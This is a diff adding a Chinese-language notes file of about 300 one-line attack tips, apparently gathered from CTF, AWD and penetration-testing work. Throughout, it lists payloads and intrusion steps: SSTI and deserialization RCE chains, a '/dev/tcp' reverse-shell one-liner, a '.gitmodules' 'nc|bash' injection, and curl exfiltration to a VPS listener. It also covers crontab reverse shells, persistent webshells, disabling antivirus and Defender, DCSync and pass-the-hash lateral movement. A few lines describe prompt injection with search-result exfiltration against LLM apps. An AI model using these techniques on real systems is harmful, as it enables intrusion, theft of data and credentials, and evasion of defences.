@@ -1,0 +1,1207 @@
+### OBS
+增量 cookie 响应可逐字符爆破服务端代码
+NodeJS child_process.execSync 路径 = 'child'+'_process
+Windows 驱动 IOCTL 0x222000 是 32 字节间隔 dispatch
+Move 资源 + 入口函数 + script 调 entry-less 函数
+discrete_log 在 u128 大数用 Sage 内置函数
+hash(4 字节) = 字符串前缀确认
+npm preinstall script 是供应链攻击面
+CVE-2021-43798 Grafana 文件读是经典
+bash 数组下标赋值可触发命令
+Groovy File.text 拼接 URL 是 Java 内网出网 trick
+PHP $_GET[$x]($y) 动态调用绕 cat/flag 过滤是经典
+JWT alg:none 是入门 web
+Blind XXE OOB DTD 经典手法
+include 链是 PHP 文件包含 trick
+Flask session 密钥泄露 + XXE OOB 数据外带是 web 中级标配
+abe.jar unpack 是 Android backup 拆 tar 工具
+OOB XXE 三层嵌套 (%x→%y→%z→error) 是出网 trick
+phar:// 是 file_exists/exif/finfo 等函数都触发的反序列化入口
+${IFS} 绕过空格过滤
+宽字节报错注入 admin%df
+pop rdi; ret 是 ret2libc 标准 gadget
+Squirrelly 默认 autoEscape:true 关闭 → filter 参数 RCE
+XTEA 变种关键是 delta 循环的 XOR 校正
+SMC 单字节 XOR 暴力扫是入门逆向手法
+Java AWD 优先找 readObject 入口
+fastjson-local-echo 是不出网时的盲打回显神器
+Cookie 反序列化是 AWD 经典入口
+data:// 协议 + fopen('r+') 是 LFI 经典组合，无需上传文件即可 RCE
+PHP 反序列化 4 层类链构造法：每层一个成员指向下一层对象
+LSB python2 工具是入门 stego 标配 (lsb.py extract)
+pyzbar.permutations 暴力拼二维码是 720×120 排列的常见考法
+XOR 0x70 + 输入反转是入门 reverse 套路
+Python eval(input) 是无沙箱 RCE 经典入口
+CRC32 碰撞短文件 zip 密码是 misc 入门手法
+SQL 异或注入 1'^ascii(substr())^'1 绕过关键字过滤
+费马小定理可分解 RSA modulus 的特殊构造
+php://filter iconv 链转换是高级 LFI 必备工具
+黑名单绕过要逐字符找对应 iconv 链（避开 _ 字符）
+base64 + ;/* 注释符是 LFI include payload 模板
+SUID date -f 可读文件触发 invalid date 错误信息泄漏
+0e md5 弱类型比较是 PHP 类型 juggling 经典
+字符串长度替换（phpinfo()→phpinfo()up）触发反序列化逃逸
+session.upload_progress + 文件名 |O: 反序列化是 LFI-to-RCE 经典组合
+PHP __construct 魔术方法自动调用是反序列化入口
+SUID root 程序调用外部命令或保留 SHELL 路径 = 可提权
+nmap < 5.21 --interactive + !sh 是 GTFOBins 经典
+find -exec 必带空格 + 分号才能执行命令
+date -f 读文件触发 invalid date 错误泄漏文件内容
+SHELL 环境变量劫持 suid 程序是 PATH 劫持变种
+Log4Shell (CVE-2021-44228) 是 2021 最大 Java 0day
+JNDI 注入 + LDAP/RMI 远程对象 + BeanFactory 是经典 RCE 链
+Spring Cloud SpEL ${...} 表达式注入是 web 漏洞
+Fastjson @type 反序列化触发 set 方法是 Java 反序列化经典
+高版本 JDK 禁用远程 codebase 需用本地 gadget (Tomcat BeanFactory)
+PHP 0/0=NAN + 全角字符是字符构造经典
+PDF 内嵌 JPG 触发 SHA-1 碰撞 (SHAttered) 是 0day 利用
+禅道 pms CVE 是国内常见 CMS 漏洞
+BMP 像素异或还原是 stego 经典
+Python list(dict()) 取空字符串是经典沙箱逃逸
+zip 自动解压是 RCE 经典（filename 命令注入）
+MongoDB password[$regex] 是 NoSQL 注入字符爆破
+XOR ring 方程组是 reverse 入门
+AWDP 关键是抢弱口令（ctf:ctf 通用）+ 立即改密
+phpMyAdmin CVE-2018-12613 是经典后台任意文件读漏洞
+ThinkPHP6 反序列化链：Model+Request+Store+Channel+Url+Pivot 全链路触发
+e=23 + 6 个 modulus 是低指数广播可 CRT 还原
+CVE-2023-51385 走 .gitmodules 注入 nc|bash
+Redis 主从复制 + dict:// 协议是 SSRF 经典 RCE
+Python 格式化字符串漏洞可泄露 admin 密码
+ZIP 文件名隐写排序拼接是 MISC 入门技巧
+vm2 3.9.16 用 Error+Proxy+apply 绕过
+Spring Boot 原生反序列化走 AliyunCTF bypassit1 路线
+无参数 RCE 用 getallheaders() 拿 HTTP头触发 system
+整数溢出 -2^63+0xc 绕 key 验证是 PWN 经典
+Dreamer CMS 主题包 themePath 是经典后台读文件漏洞
+ceye.io + XOR 密钥拼接泄漏仍是经典外带思路
+DNA 三联密码替换是 UUID flag还原套路
+PixelJihad + Decabit + LSB 是图片综合隐写
+Node 数组 tolowercase 异常泄露 cookie
+Unicode 拆字节污染 HTTP 头
+EJS 原型链污染 RCE
+codefever implode 数组拼空格是命令注入经典
+限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDBC fileread 是高成功率替代
+Flask site.addpackage 是 Python web RCE 冷门但致命的入口
+SROP 配合 offbyone + house of orange 改 top chunk 是 libc-2.27 经典三连
+正则 + 后 6 位 IOC 匹配是流量分析通用思路
+mysqlbinlog 恢复 SQL 是取证定位攻击时间线关键
+Python 原型链污染必须显式允许 safe_modules=['os','builtins'] 才有效
+JVM-SANDBOX 启动时调用 uninstall() 可彻底关掉 RASP
+phar:// + gzip 压缩 GIF89a stub 绕 PILER 是图像文件包含经典 trick
+pickle reduce eval 是 Python 内存马标配
+agent.jar 反编译定位 AgentLauncher 是 JVM 沙箱 escape 关键
+FastAPI add_api_route + exec 是 Python 内存马注册最快方法
+symlink TOCTOU 攻击 = 20 线程并发改写路径 → 抢占 phpcode
+ECDSA nonce k 线性组合 → 已签名点也线性组合 → 还原私钥
+hash+XOR 流密码在已知前缀块下可逐位爆破
+数字 md5（如 0cc175b9c0f1b6a831c399e269772661 = md5('a')）是单字节爆破关键
+Flask secret 弱密钥爆破可伪造 session（flask-unsign）
+tac 是 SUID 提权工具，tac /flag 比 cat 更隐蔽
+cJSON_Parse 栈溢出是 2024 流行 pwn 题入口（解析器漏洞）
+软件供应链靶场核心：开源自带漏洞 + 默认口令 + 内网横向
+禅道/向日葵/jumpserver 几乎年年有未授权 RCE
+YARN REST API 默认 8088 暴露就送 shell
+Docker Registry 5000 端口 + auth=base64(user:pass) 是无认证的私有镜像金库
+Java Proxy 透明代理+javaagent hook 是 CTF 高级 web 套路：拿到 jar 注入 javassist 改 send 逻辑
+ENV/DIFF/FILE/FUN POP 链核心是 ENV.__toString 调 putenv+system
+FILE.__call 写文件配合 LD_PRELOAD 绕 disable_functions 是 2024 web 题标配
+mysql_native_password auth 字符串触发反序列化是 Java Proxy RCE 入口
+存储型 XSS 必须靠 admin-bot 触发，submit 提交机制是触发入口
+栈迁移到泄露地址可绕小 buffer，system 函数地址 + leave_ret 经典组合
+SM4 是国产商用密码（分组 128-bit 密钥 128-bit），apk native 层加密常见
+分段加密题先分段解再拼接，注意端序（如 Z0099864 → 4689900Z）
+WP 找不到原题直接搜代码 hash 经常能找到原作者
+Spring SpEL 注入通过 `[[${...}]]` 触发，`T(Class).forName` 反射调用是经典 payload
+PHP 8 class@anonymous 0x00 截断是高版本 PHP 调试输出文件名的常用技巧
+Rust core::arch::asm! 内联汇编做 ORW 是 2024 新趋势
+pickle + signal chips + LLL 矩阵是 Sage 还原稀疏向量的经典路径
+PHP 自定义 session 加密可用已知明文（client IP/time）反推 key
+PDO prepare 字符串拼接仍可注入（预处理无效场景）
+phar:// + file_get_contents 是经典 phar 反序列化触发点
+POP 链改 admin 密码 + 后台登录 + 模板 RCE 是 PHPEMS 三段式攻击
+Go math/rand 不 Seed 时默认种子=1，rand.Read 输出跨进程可复现 → session/cookie 伪造通用套路
+uint32 加法溢出 pow(2,32) - N 是 CTF Web 高频套路（首数字溢出为零）
+CVE-2025-32463 sudo EoP chwoot 是 2025 新 sudo 提权漏洞，/woot1337 libnss_ + nsswitch.conf 是关键
+gin.SetMode(Release) 屏蔽调试日志，但 source code 仍可审计
+Vite 0day /@fs/app 目录穿越 = 任何绝对路径文件可读
+Object.freeze() 不能冻结 .constructor → Math.constructor=Function 是沙箱逃逸通用通路
+saferEval 正则匹配 Math.\w+ 但不匹配 Math.constructor
+cookieSession 用 keys[] HMAC 签名，拿到 keys[] 即可伪造 PHPSESSION
+md5 collision（fastcoll）是 PHP 弱类型比较经典组合
+ThinkPHP 3.2.2 db[] 写配置 RCE 是历史 CVE，必须无 disable_function 才有效
+is_numeric + 弱类型 == 字符串拼接绕过是 PHP 老牌套路（289114abc 假阴性但 == 289114）
+费马小定理 2^hint ≡ 1 mod p → p = gcd(2^hint-1, n) 是 RSA 隐 p 通用攻击
+Quat BSGS secret<2^50 比暴力 Pohlig-Hellman 快得多
+JWT 弱 secret 爆破 2 字符 3844 次是常考点
+Connection: close,X-User 头注入让服务端把 X-User 当 hop-by-hop 丢弃是经典 Web trick
+MT19937 单 bit 状态基底可建 GF(2) 上 LLL 还原，是 624 状态上 group action 思路
+setcontext+61 + _IO_wfile_jumps+0x10 作 vtable 是 ORW RCE 经典链（glibc 2.35+）
+MMX 编码 = XOR → 16-bit 字内 swap → 64-bit ROL1 → 逐字节加 key8 完全可逆
+ptrace int3 调度是 anti-RE 的 VM 形态，子进程跑原 binary 父进程拦截
+SSTI 沙箱 disable 删配置即可破，最稳 payload ''.__class__.__mro__[1].__subclasses__()[80]
+FastJson 1.2.80 黑名单禁 FileOutputStream 但应用自定义 FilterFileOutputStream 仍可借 sun.rmi.server.MarshalOutputStream 走 RCE
+CVE-2022-25845 = 双 @type 链触发 JsonGenerationException 缓存 UTF8JsonGenerator
+/etc/crontab 写反弹 shell 是 FastJson 反序列化经典后渗透动作
+Frida hook .so+offset 是安卓 native 反向的常规做法
+GitHack / GitTools 是 .git 源码泄露首选工具
+fastcoll 工具是 MD5 碰撞最简方案（生成两个不同文件同 MD5）
+ssh 日志找 attacker IP 是经典溯源题套路
+dnsmasq.log 可疑域名是 CTF 溯源题常见提示
+action=eval 后门 param phpcode=system('cat /flag') 是 PHP 后门经典
+Flask SSTI 经典 payload `cycler.next.__globals__.__builtins__.__import__` 是绕过 eval/exec 关键字黑名单最稳的链
+大写化字符串 + 后置 .lower() 绕过 'nl' 关键字黑名单是字面变形通用手法
+Express + req.query 直接拼接是 SQL 注入高频坑
+sqlmap tamper=space2comment 绕空格过滤是 web 注入老牌技巧
+flask 黑名单 substring 阻挡 vs payload 字符串拼接要分清
+伪装 .webp/.png/.jpg 是反检测常规手段（CAFEBABE 头 magic number 直接暴露 .class）
+加密协议魔数 + RSA 会话密钥 + LZRR 自定义压缩是常见样本偷数据模式
+BackupExec RPC 是历史漏洞重灾区（OpenRemoteFile NDR）
+format string 配合 view_functions.__globals__ 是 Flask API_KEY 泄漏经典
+奇偶 batch 不同算法（algo3/algo2 + keyless/known-plaintext）是流量解密分阶段套路
+K8s RBAC 边界是 namespace，跨 namespace pods.* create 是合法权限
+PodSecurity restricted 是 v1.25+ 默认 baseline（allowPrivilegeEscalation=false 等）
+NetworkPolicy 控制 ingress/egress 是常见容器逃逸限制
+busybox 镜像通常在 allowlist 中
+kubectl auth can-i --list -n <ns> 是 RBAC 探测第一步
+BASH_FUNC_env%% 函数名导出自 2014 Shellshock 漏洞至今仍是 CGI 风险
+JSON.stringify/parse 钩子是 Web 前端 exfil cookie/flag 经典手法
+TLS-poison 在 SNI 后 32 字节注入可绕过部分 7 层 IDS
+vsFTPd PASV 模式可引到非 FTP 服务做 MySQL 攻击
+MySQL LOAD DATA LOCAL 是任意文件读客户端侧漏洞 2018 后被默认禁
+is_numeric + preg_match /^[0-9...]/i = %09 (tab) 旁路是经典组合
+PHP_SESSION_UPLOAD_PROGRESS 是 LFI-to-RCE 必杀 (前提 session.upload_progress.enabled=on)
+race 1MB padding 保证 include 时文件活过 GC
+multipart form 含 PHP_SESSION_UPLOAD_PROGRESS 字段触发 session 内容可控
+session.save_path=/tmp 是默认配置意味着固定路径
+AWD 节奏固定为找后门、写后门、修后门、拿 flag 四段式
+不死马通过 usleep 5000 + while 循环 file_put_contents 防杀
+主流 CMS 配置文件路径（DEDECMS / Wordpress / DiscuzX / PHPCMS）要背熟
+crontab 5 分钟一轮是常见 scoring 周期
+clickhouse URL() 是 SSRF 提权经典
+DNS o/i 域名后缀隐写 0/1 bit 是常见 misc trick
+类型混淆 + UAF 改指针字段是堆题经典链
+dog.age = cat.strings 指针字段是覆盖关键
+HS256 弱 secret 用 sha256(timestamp) 是常见 CTF 套路
+/proc/self/environ 泄露 secret_path 是 Flask 经典读路径
+date 命令注入绕过用 meta refresh 不走 URL
+pickle __reduce__ 返回 os.system 是 RCE 经典手法
+实网渗透 4 步曲：目录扫 → 凭据/源码泄漏 → 文件上传 getshell → SUID 提权
+find SUID 提权是 find . -exec /bin/bash -p ; -quit 的经典 GTFOBins 套路
+Renpy .rpyc 编译产物必须用 unrpyc 反编译，否则看不到 game logic
+硬编码 1.exe 输出 XOR 35 是解密逻辑反过来：输出 XOR 35 = 用户输入
+现场盲区（fscan 邮件网关）很正常，赛后复现比硬刚效率高
+SSTI 沙箱禁 print 不等于禁 __globals__.__builtins__.__import__，字符串拼接可绕关键字
+addslashes + SELECT 大小写不敏感是经典 WAF 绕过
+glob:// 流协议是 PHP 文件发现利器，配合循环爆破可扫未知文件名
+12 字符限制下 sort%09 文件名代替 cat 是 Linux 命令节省字符的经典 trick
+blacklist 列表不全时反推（cat/&&/||/space 全拦但 sort%09 没拦）
+XS-Leak + RCE 是现代 WEB 难度的天花板——纯前端时间侧信道 + 协议层走私组合
+font-face + unicode-range 是经典 timing oracle，可猜任意长字符
+WebRTC STUN 信令会泄露子域 (iceServers 注入)，盲打内网常用
+HTTP Request Smuggling CL.TE 在 nginx+后端组合下频繁出现
+PNG 头 IHDR 段格式固定，可爆破 w/h 反推 CRC
+PHP 反序列化 4 步链 (destruct → toString → invoke → clone) 是 RCE 模板
+Flask SSTI 字符黑名单不可全 - 字符串拼接 + __globals__ 仍可绕
+RSA PKCS1_v1_5 链式加密需要逐层解密 + 拆 IP 头拼接
+300x300 矩阵异或 → 成图技巧是 misc/reverse 的常考点
+EJS render(view, options) 把 options 传到 View 内部，污染 settings/opts 是 RCE 经典链
+outputFunctionName 是模板生成函数注入点（CVE-2022-29078 风格）
+Express req.query 信任等同于完全控制 opts → 必须 sanitize 或白名单 options
+prototype pollution 与 view options 污染可叠加（shell/prepended/delimiter）
+客户端逃逸服务端模板注入是 Node.js web CTF 高频考点
+POP 链构造关键是 '找到包含可调用方法的对象作为下一个对象的属性
+fine.cmd='system' + fine.content='cat /flag' 是 PHP 反序列化命令执行经典 payload
+/file.php?m=show&filename=file.php 是任意文件读取的源码泄露漏洞
+SUID date -f /path 是 Linux 提权经典（date 可读取任意文件内容）
+bash -i >& /dev/tcp/x/y 反向 shell 比 nc 更稳（无需 nc 监听）
+SSTI 过滤了 `__class__` 等关键字时，unicode 编码 `\u005f\u005f...` 是万能绕法
+{%if(...)|attr()%}1{%endif%} 形式比 {%print%} 更通用，能绕过 print 关键字过滤
+外带数据法（curl + vps nc）是 SSTI 盲注的标准手法
+phar 反序列化是 PHP 文件上传漏洞的延伸，触发条件包括 file_exists / is_dir / fopen 等
+composer.json 泄露 + fakerphp 引用 = PHP 反序列化新型 gadget 入口
+K8s CRD 题目核心是 operator.py 审计（Python kubernetes-client + watch.Watch().stream）
+Flagprotector CRD 是反作弊机制，必须先 delete 才能 apply Flagrequest
+anti-bruteforce 字段实际是反 token 提示，不是真的爆破防线
+K8s 题目常见三大 CRD：Flagrequest（题目）/ Flagprotector（防御）/ Flag（输出）
+Nunjucks SSTI 经典 payload：{{process.mainModule.require('child_process').exec('cmd')}}（Node.js 特有）
+SQLi 双引号闭合 + MySQL GTID_SUBSET 报错注入是 sqlmap 自动识别模式
+JWT 密钥泄漏 → admin 密码字段 notes → 伪造 JWT 是常见 web 升级路径
+webhook 外带 flag 时必须 base64 编码，避免特殊字符截断
+LLM 应用 IDOR（图片 ID / 用户 ID 枚举）是最常见 web 题类型
+prompt injection 配合 google 搜索结果外带是 LLM 题目标配
+短选项 = 正确选项是 LLM 出题的反向指纹（出题者通常写简短正确答案）
+LLM 题目三件套：IDOR + prompt injection + 短选项统计
+Spring Cloud Function routing-expression 是 Spring4Shell 变种 (CVE-2022-22963)，T(java.lang.Runtime).getRuntime().exec() 是 SpEL payload 模板
+SpEL EL1001E 错误信息暴露 exec 执行成功但返回 Process 对象，必须外带（bash -i / curl）
+三步反弹：写 rce.sh + python -m http.server + curl 下载 + bash 执行，避开 inline exec 长度限制
+nmap 看到 Nagios NSCA 是 Spring 常见端口（8080）标志
+TypeNameHandling=All 是 Json.Net 反序列化漏洞开关
+RolePrincipal 是 .NET 经典 Process.Start gadget
+ysoserial 一键生成 gadget payload
+ActivitySurrogateDisableTypeCheck 是反序列化保护绕过
+Clone() 路径是触发点，UpdateTodo 是 payload 投递通道
+mpdf SVG/WMF 多边形指令可触发 Parse Error
+preg_match 白名单必须遵守，可绕思路：协议升级
+错误消息中泄露环境变量是 PHP 通用思路
+hcaptcha 是 anti-bot，但 submit 后不重检
+PHP file_get_contents + URL 控制是 SSRF 入口
+Solidity 0.8.0+ 的整数溢出已内置检查，必须在合约逻辑层面（merge_gems）人为构造攻击面
+区块链对战类题目的 front-run / mev 模式：counts 状态机推进 + decide_continue_battle 真值表是关键
+Ilus 接口暴露的 spec.anti-bruteforce token 是反爆破机制，需精确填入
+Solidity 0.8.x decompile 输出大量 placeholder（0x3c5269d8 等），需逐函数 selector 还原
+Oracle Java Source 注入是 CTF Oracle 题经典提权链（创建 class → 调用 static 方法）
+dbms_cdc_publish 是 12c+ 默认 system 权限的执行点
+pboot CMS 模板标签 `{pboot:if}` 接受 PHP 表达式 → RCE
+Oracle → Windows 内网跨平台提权要善用 PRAGMA AUTONOMOUS_TRANSACTION
+复杂内网拓扑必须 frp 多级代理 + proxychains
+Fastjson 高版本必须靠 MySQL_Fake_Server + JDBC 反序列化绕 autoType
+Proxylogon（CVE-2021-26855）是 Exchange 一键 SYSTEM
+exchange 机器账户默认有 domain-object writedacl → DCSync 攻击链
+PTH 是绕过 NTLM 限制拿域管的标配
+手机号字典爆破 PKZIP 是社工 + 密码学的结合
+MSSQL 弱口令 + xp_cmdshell 是经典入口链
+MSF incognito 是模拟 token 的最稳定工具
+tsclient 共享是 RDP 残留凭据常见位置
+镜像劫持 magnify.exe + 可写 Image File Execution Options 是经典提权
+机器账户在 Domain Admins 组 → 直接 DCSync
+文件上传漏洞的核心是 Content-Type 欺骗 + 后缀过滤绕过
+PHP 白名单 eval 用 chr / 反引号 / GET 参数动态函数
+Flask + pydash.set_ 是 Python CTF 的 RCE 神器
+Jinja2 lipsum().__globals__ 是 SSTI 短 payload 通用解
+PHP 反序列化 POP 链靠魔术方法（__destruct/__toString）串接
+CVE-2022-28368 dompdf 远程字体加载 = 上传 .php + .css（@font-face）+ .html（<link>）三件套 + md5 缓存路径计算
+Android StubApp 一代壳 = JNI_OnLoad + smali 注入 + libstub.so 加密 + unicorn/androidemu 模拟 + UC_HOOK_MEM_WRITE hook
+Kryo 反序列化的关键：setReferences(true) + register(Mocha.class) + 反射 setter 是 Mocha 攻击链标配
+Spring RequestMappingHandlerMapping 内存马 = 反射 urlLookup Map + registerMapping 注册恶意路由（无文件落地）
+JNI exec = popen + strcat 是 Java/JNI exec 后门最小化实现（env->NewStringUTF 返回 result）
+DUP1-DUP16 是自拷贝的关键,无需 PUSH 就能复用栈顶元素
+白名单 opcode 限制下必须构造'既能执行又恰好等于自身 bytecode'的数据
+EVM bytecode == runtime return 是 Create2 / minimal proxy 的通用手法
+Flask session secret_key 与启动时间挂钩可爆破
+X-Forwarded-For 是入门级 IP 伪造
+EJS settings[view options][escape] 是 RCE 高危面
+largebin attack 写全局变量是 ret2libc 前置
+SHA-1 chosen-prefix collision 是 google 2017 攻击，CTF 经典题型
+PHP system($_GET['cmd']) 是 web 题最朴素的 RCE 入口
+Flask eval 阻断名单常漏 __class__/__subclasses__ 链，可走 Python 元类链
+regex 黑名单通常可被 Unicode/URL 编码绕过
+注册/验证 race condition 是 web 经典漏洞
+OAuth 缺 state 必导致 open redirect 触发 XSS
+HTML2PDF render_template_string 接受颜色参数是 SSTI 入口
+Python 元类 type(type(1)) 配合 __eq__/__hash__ 绕过是 pyjail 经典手法
+ReDoS 延迟是 race 窗口的放大器
+JSONP + URLSearchParams.get 不解码是 web 高阶绕过
+opener.opener 跨窗口读取同源页面内容是经典 XSS 提权
+iframe name + focus + activeElement 是逐字符提取 UUID 的盲注技巧
+feature policy sync-xhr none 是反 sync-xhr 防御
+Same Origin Method Execution 是 JSONP 攻击理论核心
+pickle 显式 import 黑名单时 posix.system 这类「带前缀的等价模块」常被遗忘
+dp 泄露 + 大 e 不能简单遍历，需用 pxorq 从两端向中间搜索
+JWT 弱口令爆破（6 位以内）是 HS256 常见攻击
+flask-session-cookie-manager 是伪造 Flask session 标准工具
+短小 PHP 后门常用反引号 + 自增 (++) + 异或 (^) 绕静态分析
+运行时 payload 拆分 + 链式自增是 PHP 无字符后门经典手法
+shell_exec() 抛 ValueError 是反混淆调试信号
+echo $_55 调试打印拼出字符串是后门还原关键
+CakePHP 反序列化链 fix 通常只改头尾，中间环节 (BehaviorRegistry._methodMap) 常被保留
+PHP 反序列化三件套 (__destruct→__toString→__call→eval) 是 PHP 链子通用模板
+Cake\ORM\Table.__call 间接转发到 BehaviorRegistry.call 是 5.x 新链入口
+system() 弹 shell 后 suid find 提权是 /root/flag.txt 经典解法
+PHP Gadget 链常以「destruct→call→toString→eval」为模板
+命名空间 (GadgetOne/Two/Three) 故意制造跳转是出题常用套路
+PHP ReflectionClass setAccessible(true) 改私有属性是反序列化 gadget 标准构造法
+WAF 用 === 严格比较而不是 == 是反绕过的常用防御
+Hibernate StatisticsService sessionFactoryJNDIName 是经典 JNDI 注入点
+URI regex ^scheme:// 只校验前缀，authority 部分允许 @ 触发重定向到 file://
+Liferay canSerialize 黑名单可绕过（StatisticsService 未在列表）
+PHP 7.0 Throwable $name 格式串 bug 是真实 CVE，#71105 编号可查
+max_input_vars 触发 warning 能破坏后续 header 输出，绕过 CSP
+Laravel + mPDF + phar:// 是经典 PHAR 反序列化链
+mysqli_options 接受任意 option 编号 + string value，可绕过多数默认防护
+secure_file_priv 路径必须先盲注爆破，不能假设 /tmp/
+Symfony Doctrine 反序列化链 RedisProxy.__call → Dumper.__invoke → system() 是常见 POP 链
+PHP 无字母数字 RCE 核心是 ^ XOR 还原字母（%01-1F 与 ` 等）
+LLL 梯度下降 4 维可恢复 128 维 lattice 私钥
+pwnable 中 nesemu 是稀有 IoT 模拟器，pwntools 没有直接支持
+经典 '双 // 绕过 Spring filter' + 'Node 8.x HTTP 拆分' + 'EJS constructor.prototype 绕 __proto__ 过滤' 是 2022 经典三件套
+HotSwappableTargetSource → XString.toString() → TemplatesImpl 是 Spring 反序列化 toString 链标准
+JSON 类型混淆 {checkcode:{length:16}} 触发 try-catch 跳出长度检查是 Node.js 经典绕过
+EJS 模板污染通过 __proto__ 污染 vs constructor.prototype 直接污染 是 2022 重要绕过对比
+PHP zend_extension 自定义 RC4 解密 + sudo chmod 777 /flag 是 unusual php 特殊点
+RunUpdate.bat 类批处理日志直接暴露 net use 凭据是 Windows 域内网经典
+rbcd.py + getST.py 是 impacket 域内 RBCD 委派攻击标配
+rot47 是 ROT13 变种，覆盖 ASCII 33-126，比 ROT13 更宽
+swiftmq 5671 SSL AMQP + pika SSLOptions 是消息中间件 SSL 通信标配
+IPv6 主机发现是内网扫描新维度，比 IPv4 更隐蔽
+PostgreSQL 预认证信任关系 + 明文通信 + COPY FROM PROGRAM 是经典云内网 RCE 组合
+core_pattern 反弹 shell 是 Linux 容器逃逸标配（'|' 开头 + kill -11 触发）
+Scapy 伪造 TCP 包需要精确交换 seq/ack + src_ip/dst_ip 才能让 server 接受
+Docker 容器内 sudo -l 检查 wheel 组是提权第一步
+TCP DataRow 字段解析是 PostgreSQL 协议逆向入门点
+gzip 双成员 polyglot 是 PDF+pickle 联动 RCE 的经典技巧
+MT19937 收集 624 个 32-bit 输出即可恢复内部状态
+BPF map 越界 + array_of_map 堆喷是 Linux kernel bpf 子系统提权路径
+split_master 重组 bit 流是 LFSR 多段密钥常用解法
+pdfminer CMapDB._load_data pickle.loads() 是 Python PDF 库典型 RCE 入口
+SVG 中 unicode 4p2V/77iP/4p2G 模式是 CTF 中常见的'unicode 替换表'隐藏 flag 手法，配合动态密钥（XOR WMCTF_2025_SVG_ANALYSIS）双重保护
+pdfminer pickle.loads() 是 Python PDF 库 RCE 入口，必须 gzip 双成员 polyglot 才能触发
+Flask eval + __builtin__ 限制可通过 mainModule.constructor._load('child_process') 逃逸
+MT19937 624 输出定理 + secret_key 预测是 Flask session 伪造经典
+20 维 LLL 是同余 Diophantine RSA 攻击标准 blocksize
+经典 general_log 注入 EJS 模板链：把 SQL 注入的 select 出口指向 .ejs 文件，注入 <%= ...execSync('/readflag') %> 执行任意命令
+/post/11 union select load_file 是 MySQL 注入读文件标准手法
+pm2 日志是 Node.js 应用审计突破口，常泄露 admin 操作路径
+邮箱白名单常见于注册绕过题（4 个邮箱 hash 必中）
+SSTI 路径可控时可直接 file= 控制模板名触发渲染
+cdk_linux (container-escape) + mount-procfs 是 2025 CTF 容器逃逸标配
+Spring Cloud Gateway SpEL RCE 经 /routes 接口是经典外网入口
+JdbcRowSetImpl JSON 反序列化触发 RMI/LDAP 是 fastjson 系列标配
+zabbix userdirectory LDAP 凭据是内网域渗透突破点
+bloodhound-ce-python + nxc smb 是无 GUI 域渗透标配
+当 OpenVPN .ovpn 配置文件中 remote 是内网 IP 时，直接改成外网入口 IP 即可绕过 NAT
+Spring Boot 应用的 application.yml 默认存数据库密码是经典配置泄露
+邮件钓鱼 + 免杀 exe + 改 Administrator 密码是内网横向标配
+SafeDog 杀软 net stop + Set-MpPreference 关闭是腾云进设通用方法
+PTH（pass the hash）通过 impacket-wmiexec 横向是 Windows 域标配
+IronWAF 2.0.3 用 /**/ 绕空格检测
+LFI 路径中 %253f (双 URL 编码) 绕 check 内 file_exists()
+sudo -l NOPASSWD:simpler.py 用 $() 绕 & ` | ; - 字符黑名单是经典 sudo 提权
+mysql.user 密码 hash 用 hashcat + 字典爆破是 HTB 标配
+phpmyadmin LFI 配合 PHP session 文件包含是经典 HTB web→root 链
+CMS 默认密码 OctoberCMSPassword!! + config/database.php 路径暴露是 2017 老牌 CMS 经典
+栈溢出 brute libc base 用 while true; do ovrflw "$payload"; done 是无 ASLR/PIE 时代的标配
+32 位 ELF NX+Partial RELRO+无 Canary+无 PIE = ret2libc 标配
+October CMS 1.0.412 已知 CVE-2017 上传 bypass 是直接 RCE 入口
+libc base brute 是把整个 libc 库 dump 出来后 readelf 找 offset
+SOME (Same-Origin Method Execution) 攻击是黑帽 EU 14 论文提出的经典 XSS 替代技术
+sync-xhr 特征策略 + %00 URL 截断是绕 XHR fallback 触发 JSONP 的标配
+iframe name + document.activeElement 字符级盲注是 Realworld CTF 标准手法
+admin.user 校验 + CSRF token 是 modern web 双层防护
+36 字符 UUID + alphabet='0123456789abcdef-' 16 iframe 是泄漏优化配置
+JWT 用 public.pem 作 HS256 secret 是经典算法混淆漏洞
+URL 对象 pathname 可绕关键字正则
+LCG 等差数列求 N 用 GCD 三个二阶差分
+angr entry_state + simulation_manager 找 good/avoid 路径
+栈迁移到 bss + leave_ret 是经典 pwn 入门
+Character.toUpperCase() 中 'ı'→'I' 'ſ'→'S' 是 Java 经典 Unicode case-folding 漏洞
+ffifdyop 经 MD5 后得 'or' 触发 SQL 注入绕过
+JWT_SECRET_KEY 泄漏直接伪造 token
+反序列化链 + replace 长度变化构造是 PHP pop 链关键
+rustscan 比 nmap 快 10×，ulimit 需 ≥5000 避免缓冲
+grpc.reflection.v1alpha 是反射服务，必装才能 list service
+SimpleApp 弱密码（用户名枚举）是 gRPC 题常见入口
+pyload 9666 端口 + SSH 公钥植入是 HTB 常见三拓
+MinIO Windows 用 \ 可绕过 / 路径过滤
+PostPolicy multipart Content-Type 大小写绕过签名校验
+cluster bootstrap API 不应暴露 env vars（含 AK/SK）
+MINIO_UPDATE_MINISIGN_PUBKEY 是 binary 签名验证关键 env
+Ofbiz ProgramExport groovyProgram 是经典 Groovy 沙箱 RCE
+Struts2 upload filename=../../../views/a.jsp 是写 JSP 木马标准路径
+Shiro 默认密钥 + CommonsBeanutils 反序列化是 Java 经典 RCE
+ActiveMQ ClassPathXmlApplicationContext 是 Spring XML 反序列化关键
+captcha random.seed 可预测 → Django CSRF token 破裂
+EasySwoole 默认 SERIALIZE_PHP = 反序列化 RCE 关键配置
+爬虫无协议过滤 + Redis SERIALIZE_PHP = gopher 注入 SSRF 经典链
+Prophecy + PHPUnit MockObject 是 PHP 反序列化常见 gadget 库
+Swoole framework system() 无回显需 throw Exception
+消息队列 customer/broker/merchant 漏洞在 webhook 重放
+dict:// Redis module load exp.so 实现 RCE
+redis-rogue-server.py 是 SSRF→Redis RCE 经典工具
+404 页面收集 + 302 跳转分析是 picup 入口
+sql-proxy.jar Base64ClassLoader 动态加载类是 Java agent 注入关键
+Java agent 加个函数诡抣 socket send 是改 MySQL 协议响应核心
+tarfile 软链接覆盖写入漏洞（CVE-2007-4559 同源）
+MySQL UDF 提权需要 plugin_dir 写入权限
+SSTI 反弄 shell 是 web 入口常用 RCE 模式
+JWT alg=none 是签名校验类题最简单绕法，比破解 secret 优先
+sqlmap --search 是从已知字段反查注入点的利器
+应急响应清痕迹 (crontab -r + /var/crash) 是常见溯源题考点
+Joomla 3.7.0 com_fields SQL 注入 (CVE-2017-8917) 是 CMS 题高频 CVE
+Wireshark 流号定位比字符串搜索更高效
+拟态防御 (mimic defense) = 邬江兴院士 + 紫金山实验室, 三语言异构体需一致响应过表决
